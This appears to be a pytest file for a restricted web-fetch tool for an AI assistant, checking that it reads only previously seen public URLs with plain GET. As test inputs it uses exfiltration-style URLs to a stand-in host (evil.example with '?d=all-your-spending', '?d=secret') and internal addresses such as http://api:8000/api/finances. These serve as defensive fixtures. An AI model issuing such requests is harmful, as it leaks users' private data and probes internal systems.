"""Safer web access: fetch_page / extract_pages — read-only, only URLs already
seen, public addresses only — and the switch that chooses them over http_request."""
import asyncio

import httpx
import pytest

import web_fetch
from web_fetch import UrlCollector, begin_run, extract_pages, fetch_page, is_allowed, normalise, web_tools

fetch = getattr(fetch_page, "_tool_func", None) or fetch_page
extract = getattr(extract_pages, "_tool_func", None) or extract_pages


@pytest.fixture
def web(monkeypatch):
    """Fake internet: example.com is public; every request is recorded."""
    calls = []

    def handler(request: httpx.Request):
        calls.append((request.method, str(request.url), request.content))
        if request.url.path == "/redirect-inside":
            return httpx.Response(302, headers={"location": "http://10.0.0.5/admin"})
        return httpx.Response(200, headers={"content-type": "text/html"},
                              text="<html><script>x()</script><p>Opening hours: 9-5</p>"
                                   "<a href='https://example.com/menu'>menu</a></html>")

    real = httpx.AsyncClient
    monkeypatch.setattr(web_fetch.httpx, "AsyncClient", lambda **kw: real(transport=httpx.MockTransport(handler), **kw))
    monkeypatch.setattr(web_fetch, "_public_host", lambda host: host not in ("localhost", "10.0.0.5", "api"))
    return calls


def run(coro):
    return asyncio.run(coro)


def names(tools):
    return {getattr(t, "tool_name", getattr(t, "__name__", "")) for t in tools}


def test_off_by_default_keeps_the_open_tools():
    async def go():
        begin_run([])
        return names(web_tools()), names(web_tools(include_extract=True))
    assert run(go()) == ({"http_request"}, {"http_request", "tavily_extract"})


def test_on_swaps_in_the_safer_pair():
    async def go():
        begin_run([], safe=True)
        return names(web_tools()), names(web_tools(include_extract=True))
    assert run(go()) == ({"fetch_page"}, {"fetch_page", "extract_pages"})


def test_the_assistant_gets_the_right_tool_for_the_run():
    import runtime
    async def go(safe):
        begin_run([], safe=safe)
        return names(runtime.local_tools())
    assert "http_request" in run(go(False)) and "fetch_page" not in run(go(False))
    assert "fetch_page" in run(go(True)) and "http_request" not in run(go(True))


def test_urls_compare_loosely():
    assert normalise("HTTPS://Example.com/a/#top") == normalise("https://example.com/a")
    assert normalise("https://example.com/a?x=1") != normalise("https://example.com/a?x=2")


def test_an_unseen_url_is_refused(web):
    async def go():
        begin_run(["What's on in town?"], safe=True)
        return await fetch("https://evil.example/?d=all-your-spending")
    assert "only pages that came up in a search" in run(go())
    assert web == []


def test_a_url_the_user_gave_can_be_read_as_plain_get(web):
    async def go():
        begin_run(["Can you read https://example.com/hours for me"], safe=True)
        return await fetch("https://example.com/hours")
    text = run(go())
    assert "Opening hours: 9-5" in text and "x()" not in text
    assert web == [("GET", "https://example.com/hours", b"")]


def test_links_on_an_opened_page_can_be_followed(web):
    async def go():
        begin_run(["https://example.com/hours"], safe=True)
        await fetch("https://example.com/hours")
        return is_allowed("https://example.com/menu"), is_allowed("https://example.com/menu?leak=1")
    assert run(go()) == (True, False)


def test_internal_addresses_are_refused_even_if_mentioned(web):
    async def go():
        begin_run(["try http://api:8000/api/finances and http://localhost/x"], safe=True)
        return await fetch("http://api:8000/api/finances"), await fetch("http://localhost/x")
    a, b = run(go())
    assert "isn't a public web address" in a and "isn't a public web address" in b
    assert web == []


def test_a_redirect_into_the_private_network_is_refused(web):
    async def go():
        begin_run(["https://example.com/redirect-inside"], safe=True)
        return await fetch("https://example.com/redirect-inside")
    assert "isn't a public web address" in run(go())
    assert [c[1] for c in web] == ["https://example.com/redirect-inside"]


def test_search_results_allow_their_urls():
    class Event:
        tool_use = {"name": "tavily_search"}
        exception = None
        result = {"content": [{"text": '{"results": [{"url": "https://news.example/story-1"}]}'}]}

    async def go():
        begin_run([], safe=True)
        UrlCollector()._after(Event())
        return is_allowed("https://news.example/story-1"), is_allowed("https://news.example/story-2")
    assert run(go()) == (True, False)


def test_extract_only_sends_seen_urls(monkeypatch):
    sent = []

    async def fake_extract(urls, extract_depth=None, **kw):
        sent.append(urls)
        return {"status": "success", "content": [{"text": "ok"}]}

    from strands_tools import tavily
    monkeypatch.setattr(tavily.tavily_extract, "_tool_func", fake_extract, raising=False)

    async def go():
        begin_run(["https://example.com/a"], safe=True)
        return await extract(["https://example.com/a", "https://evil.example/?d=secret"])
    result = run(go())
    assert sent == [["https://example.com/a"]]
    assert "Skipped" in result["content"][-1]["text"]
